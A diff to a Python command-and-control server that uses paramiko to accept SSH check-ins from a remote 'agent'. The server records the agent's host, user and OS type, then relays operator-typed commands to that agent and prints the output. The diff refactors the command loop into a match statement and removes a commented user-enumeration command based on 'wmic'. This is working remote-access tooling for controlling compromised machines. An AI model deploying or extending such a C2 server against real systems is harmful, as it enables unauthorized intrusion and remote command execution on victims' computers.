@@ -43,60 +43,44 @@ def main():
         client, addr = sock.accept()
     except KeyboardInterrupt:
         quit()
+
     C2_Session = paramiko.Transport(client)
     C2_Session.add_server_key(HOSTKEY)
     server = SSHServer()
     C2_Session.start_server(server=server)
-    chan = C2_Session.accept()
-    print("[*] Debug info:\n" + str(chan)) #Debug info
-    if chan is None:
+    conn = C2_Session.accept()
+    print("[*] Debug info:\n" + str(conn)) #Debug info
+    if conn is None:
         print("[!] Failled authentication.")
         sys.exit()
-    success_msg = chan.recv(1024).decode()
+    success_msg = conn.recv(1024).decode()
     host = success_msg.split(",")[0]
     user = success_msg.split(",")[1]
-    print(f"[*] Agent checked in from \"{host}\" as \"{user}\".\n")
-    chan.send(" ") #Connection breaks without this line
+    type = success_msg.split(",")[2]
+    print(f"[*] Agent checked in from \"{host}\" ({type}) as \"{user}\".\n")
+    conn.send(" ") #Connection breaks without this line
+
     def comm_handler():
-        try:
-            while True:
+        while True:
+            try:
                 cmd_line = (f">> {user}@{host} ~$ ")
                 command = input(cmd_line + "")
-                """
-                if command == "get_users":
-                    command = ("wmic useraccount list breif")
-                    chan.send(command)
-                    output = chan.recv(8192)
-                    print(output.decode())
-                    continue
-                """ #A pre-defined set of commands, based on where (OS) it will be executed
-                if command == "":
-                    comm_handler()
-                if command == "exit":
-                    chan.send(command)
-                    sys.exit()
-                if command.split(" ")[0] == "cd":
-                    chan.send(command)
-                    output = chan.recv(1024)
-                    status = output.decode()
-                    if status.split(",")[0] == "True":
-                        CWD = status.split(",")[1]
-                        print(f"Changed directory to \"{CWD}\"\n")
-                    else:
-                        print(status)
-                else:
-                    try:
-                        chan.send(command)
-                        output = chan.recv(102400)
-                        print(output.decode())
-                    except SystemError:
-                        pass
-        except Exception as ex:
-            print(str(ex))
-            pass
-        except KeyboardInterrupt:
-            chan.send("exit")
-            sys.exit()
+                head = command.split(" ")[0]
+                match head:
+                    case "":
+                        comm_handler()
+                    case "exit":
+                        conn.send(command)
+                        sys.exit()
+                    case _:
+                        conn.send(command)
+                        print(conn.recv(102400).decode())
+            except Exception as ex:
+                print(str(ex))
+                pass
+            except KeyboardInterrupt:
+                conn.send("exit")
+                sys.exit()
     comm_handler()
 
 if __name__ == "__main__":
